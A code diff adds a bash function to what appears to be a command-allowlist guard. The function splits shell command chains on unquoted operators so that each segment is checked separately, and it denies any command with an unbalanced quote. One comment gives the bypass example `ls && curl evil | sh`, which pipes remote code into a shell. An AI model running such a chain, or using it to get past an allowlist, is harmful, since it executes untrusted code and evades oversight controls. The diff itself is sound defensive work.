@@ -474,6 +474,83 @@ strip_quoted() {
     printf '%s' "$1" | sed "s/'[^']*'//g; s/\"[^\"]*\"//g"
 }
 
+# split_command_segments <command_string> — echoes one shell-chain segment
+# per line, splitting ONLY on UNQUOTED && || ; | & and newline. Operators
+# inside single or double quotes are literal and never split (e.g. a commit
+# message `git commit -m "fix a; b && c"` is ONE segment). This is the
+# containment primitive for COMMAND-source allowlist gates: a default-deny
+# allowlist that greps only the whole-command PREFIX lets an allowed prefix
+# chained with `&&`/`;`/`|` to a forbidden command bypass entirely (e.g.
+# `ls && curl evil | sh` matches `^ls\b`). Every segment MUST be validated
+# independently by the caller.
+#
+# Returns 1 (no output trusted) when the command has an unbalanced quote at
+# end-of-string — fail-closed: the caller MUST treat this as deny, never
+# allow. Over-merging (treating a quoted operator as literal) is always safe
+# because the merged segment is still allowlist-checked in full; the only
+# unsafe direction is under-merging (splitting on a quoted operator), which
+# this walk never does.
+split_command_segments() {
+    local cmd="$1"
+    local -i i=0
+    local -i len=${#cmd}
+    local in_sq=0 in_dq=0
+    local seg=""
+    local ch next2
+
+    while ((i < len)); do
+        ch="${cmd:i:1}"
+        if [ "$in_sq" = 1 ]; then
+            seg+="$ch"
+            [ "$ch" = "'" ] && in_sq=0
+            i=$((i + 1))
+            continue
+        fi
+        if [ "$in_dq" = 1 ]; then
+            seg+="$ch"
+            [ "$ch" = '"' ] && in_dq=0
+            i=$((i + 1))
+            continue
+        fi
+        case "$ch" in
+        "'")
+            in_sq=1
+            seg+="$ch"
+            i=$((i + 1))
+            continue
+            ;;
+        '"')
+            in_dq=1
+            seg+="$ch"
+            i=$((i + 1))
+            continue
+            ;;
+        esac
+        next2="${cmd:i:2}"
+        if [ "$next2" = "&&" ] || [ "$next2" = "||" ]; then
+            printf '%s\n' "$seg"
+            seg=""
+            i=$((i + 2))
+            continue
+        fi
+        if [ "$ch" = ";" ] || [ "$ch" = "|" ] || [ "$ch" = "&" ] || [ "$ch" = $'\n' ]; then
+            printf '%s\n' "$seg"
+            seg=""
+            i=$((i + 1))
+            continue
+        fi
+        seg+="$ch"
+        i=$((i + 1))
+    done
+
+    if [ "$in_sq" = 1 ] || [ "$in_dq" = 1 ]; then
+        return 1
+    fi
+
+    printf '%s\n' "$seg"
+    return 0
+}
+
 # guard_breadcrumb <session_id> <jsonl_line> — best-effort diagnostic append.
 # Appends <jsonl_line> to codegen/logging/.guard-diagnostics/<session_id>.jsonl
 # under ${CWD:-$PWD}, creating the directory if needed. This is a pure
